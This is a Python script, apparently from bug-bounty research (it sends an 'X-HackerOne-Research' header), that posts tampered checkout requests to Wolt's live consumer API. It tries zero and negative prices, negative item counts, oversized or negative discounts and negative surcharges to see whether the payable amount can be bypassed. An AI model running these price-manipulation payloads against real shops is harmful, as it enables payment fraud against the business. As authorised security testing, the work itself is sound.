"""Test negative/zero price bypass via different fields."""
import requests, json

H = {
    'User-Agent': 'Mozilla/5.0',
    'Origin': 'https://wolt.com',
    'X-HackerOne-Research': 'pccp',
    'Content-Type': 'application/json',
}

VENUE_ID = '60ebeb71c6904c2caf035f71'
FAKE_ITEM_ID = '670fa3e9ead6e49d65cc3614'

def test(label, body_overrides):
    item = {
        'id': FAKE_ITEM_ID, 'name': 'Test', 'count': 1,
        'price': 100, 'base_price': 100, 'end_amount': 100,
        'options': [], 'restrictions': [], 'category_id': '', 'exclude_from_discounts': False,
    }
    body = {
        'items': [item], 'base_price': 100, 'end_amount': 100,
        'supplier_id': VENUE_ID, 'selected_delivery_method': 'homedelivery',
        'delivery_location': {'lat': 60.168142, 'lon': 24.939986},
        'currency': 'EUR', 'vendor': 'wolt', 'discount': 0,
        'basket_id': f'test-{label}', 'pickup': False, 'scheduled_time': None,
        'shipping_method': 'homedelivery', 'discount_code': None,
        'purchase_plan': {
            'venue': {'id': VENUE_ID, 'country': 'FIN', 'currency': 'EUR'},
            'delivery_method': 'homedelivery', 'menu_items': [dict(item)]
        }
    }
    # Apply overrides recursively
    def deep_merge(d, u):
        for k, v in u.items():
            if isinstance(v, dict) and isinstance(d.get(k), dict):
                deep_merge(d[k], v)
            else:
                d[k] = v
    deep_merge(body, body_overrides)

    r = requests.post('https://consumer-api.wolt.com/order-xp/web/v2/pages/checkout', headers=H, json=body)
    if r.status_code == 200:
        d = r.json()
        pa = d.get('payable_amount', '?')
        return f"200 | payable={pa}"
    elif r.status_code == 400:
        err = r.json() if 'json' in r.headers.get('content-type','') else r.text
        return f"400 | {str(err)[:150]}"
    else:
        return f"{r.status_code} | {r.text[:100]}"

print("=== NEGATIVE/ZERO PRICE BYPASS ===\n")

tests = [
    # Direct approaches
    ("price=0", {'items': [{'price': 0, 'base_price': 0, 'end_amount': 0}], 'base_price': 0, 'end_amount': 0,
     'purchase_plan': {'menu_items': [{'price': 0, 'base_price': 0, 'end_amount': 0}]}}),
    ("price=-1", {'items': [{'price': -1, 'base_price': -1, 'end_amount': -1}], 'base_price': -1, 'end_amount': -1,
     'purchase_plan': {'menu_items': [{'price': -1, 'base_price': -1, 'end_amount': -1}]}}),

    # end_amount negative while base_price is 0
    ("base=0,end=-100", {'items': [{'price': 0, 'base_price': 0, 'end_amount': -100}], 'base_price': 0, 'end_amount': -100,
     'purchase_plan': {'menu_items': [{'price': 0, 'base_price': 0, 'end_amount': -100}]}}),

    # count manipulation
    ("count=-1", {'items': [{'count': -1, 'price': 100, 'base_price': 100, 'end_amount': 100}],
     'purchase_plan': {'menu_items': [{'count': -1, 'price': 100, 'base_price': 100, 'end_amount': 100}]}}),
    ("count=0", {'items': [{'count': 0}], 'purchase_plan': {'menu_items': [{'count': 0}]}}),

    # discount field manipulation
    ("discount=huge", {'discount': 999999}),
    ("discount=negative", {'discount': -999999}),

    # negative surcharge
    ("surcharge=negative", {'surcharges': [{'amount': -1000, 'name': 'refund'}]}),
]

for label, overrides in tests:
    r = test(label, overrides)
    print(f"  [{label:25s}] {r}")

print("\nDONE")
